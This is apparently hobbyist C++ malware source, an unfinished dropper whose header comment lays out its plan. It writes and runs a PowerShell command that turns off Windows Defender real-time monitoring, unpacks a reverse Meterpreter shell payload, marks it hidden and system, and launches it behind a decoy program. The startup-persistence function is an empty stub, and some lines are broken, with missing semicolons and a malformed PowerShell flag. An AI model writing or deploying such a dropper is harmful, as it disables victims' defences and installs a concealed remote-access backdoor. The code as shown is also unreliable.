/*

* This program will perform the following tasks :
  * Create a powershell file to disable windows defender.
  * Run that powershell file.
  * First unzip the payload ( reverse meterpreter shell).
  * Add it to the startup folder.
  * Hide it as a system file.
  * Execute it.
  * Execute a dummy program as a fault front.
_______________________________________________________________________________

* Issues and problems :
  * Windows defender sometimes detects the payload.
  * Exploit can only execute ONLY if the victim is on the same network.
  * The encoding sometimes make the payload corrupted.
_______________________________________________________________________________

*
  * Made by: mrjoker05
  * Start Date: 22/02/2019
  * End Date:

*/



#include<iostream> //Basic input and output
#include<fstream> //To do file handling
#include<conio.h> // For using getch()

using namespace std;
void pscode(); // To disable windows defender                 (Done)
void startup(); // To add the program to the startup folder   (Pending)


/*
____________________________________________________________________________

*/

int main()
  {
      pscode();
      startup();
      system("expand saved");
      system("attrib +s +h MainProcess.exe")
      system("start MainProcess.exe");
  }


void pscode()
  {
    system("echo Set-MpPreference - DisableRealtimeMonitoring $true > cache.ps1");
    system("powershell cache.ps1")
  }

void startup()
  {
    // program to add the file to startup
    // win+R < shell:startup
    // opening run dialog box from cmd (bookmarked)
  }


